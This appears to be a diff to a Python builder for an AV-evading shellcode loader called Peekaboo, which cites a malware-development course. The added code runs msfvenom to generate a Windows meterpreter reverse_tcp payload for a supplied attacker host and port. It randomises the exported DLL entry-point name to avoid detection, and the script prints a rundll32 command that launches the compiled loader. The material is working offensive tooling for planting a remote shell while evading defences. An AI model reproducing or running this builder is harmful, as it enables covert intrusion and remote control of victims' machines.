@@ -1,4 +1,6 @@
 # payload encryption functions
+import argparse
+import subprocess
 import sys
 import random
 from Crypto.Cipher import AES
@@ -56,10 +58,26 @@ class PeekabooEncryptor():
         return ciphertext, self.XOR_KEY
 
     def random(self):
-        length = random.randint(8, 15)
+        length = random.randint(16, 32)
         return ''.join(random.choice(string.ascii_letters) for i in range(length))
 
-def run_peekaboo():
+def generate_payload(host, port):
+    print (Colors.BLUE + "generate reverse shell payload..." + Colors.ENDC)
+    msfv = "msfvenom -p windows/x64/meterpreter/reverse_tcp"
+    msfv += " LHOST=" + host
+    msfv += " LPORT=" + port
+    msfv += " -f raw"
+    msfv += " -o /tmp/hack.bin"
+    print (Colors.YELLOW + msfv + Colors.ENDC)
+    try:
+        p = subprocess.Popen(msfv.split(), stdout = subprocess.PIPE)
+        p.wait()
+        print (Colors.GREEN + "reverse shell payload successfully generated :)" + Colors.ENDC)
+    except Exception as e:
+        print (Colors.RED + "generate payload failed :(" + Colors.ENDC)
+        sys.exit()
+
+def run_peekaboo(host, port):
     banner = """
     #####  ###### #    #         ##         #####   ####   ####  
     #    # #      #   #         #  #        #    # #    # #    # 
@@ -71,17 +89,21 @@ def run_peekaboo():
     https://institute.sektor7.net/red-team-operator-malware-development-essentials
     """
     print (Colors.BLUE + banner + Colors.ENDC)
+    # generate_payload(host, port)
     encryptor = PeekabooEncryptor()
     print (Colors.BLUE + "read payload..." + Colors.ENDC)
+    # plaintext = open("/tmp/hack.bin", "rb").read()
     plaintext = open("./calc.bin", "rb").read()
 
     f_va = "VirtualAlloc"
     f_vp = "VirtualProtect"
     f_cth = "CreateThread"
     f_wfso = "WaitForSingleObject"
+    f_rce = "RunRCE"
 
     print (Colors.BLUE + "encrypt..." + Colors.ENDC)
     # ciphertext, p_key = encryptor.aes_encrypt(plaintext)
+    f_rce = encryptor.random()
     ciphertext, p_key = encryptor.xor_encrypt(plaintext)
     ciphertext_va, va_key = encryptor.xor_encrypt(f_va)
     ciphertext_vp, vp_key = encryptor.xor_encrypt(f_vp)
@@ -100,6 +122,7 @@ def run_peekaboo():
     # data = data.replace('char my_payload_key[] = { };', 'char my_payload_key[] = ' + p_key)
     data = data.replace('char my_payload_key[] = "";', 'char my_payload_key[] = "' + p_key + '";')
     data = data.replace('char f_key[] = "";', 'char f_key[] = "' + va_key + '";')
+    data = data.replace('RunRCE', f_rce)
 
     tmp.close()
     tmp = open("peekaboo-enc.cpp", "w+")
@@ -113,7 +136,12 @@ def run_peekaboo():
         sys.exit()
     else:
         print (Colors.GREEN + "successfully compiled :)" + Colors.ENDC)
-        print (Colors.GREEN + "rundll32 .\peekaboo.dll, RunRCE")
+        print (Colors.GREEN + "rundll32 .\peekaboo.dll, " + f_rce)
 
 if __name__ == "__main__":
-    run_peekaboo()
+    parser = argparse.ArgumentParser()
+    parser.add_argument('-l','--lhost', required = True, help = "local IP")
+    parser.add_argument('-p','--lport', required = True, help = "local port", default = '4444')
+    args = vars(parser.parse_args())
+    host, port = args['lhost'], args['lport']
+    run_peekaboo(host, port)
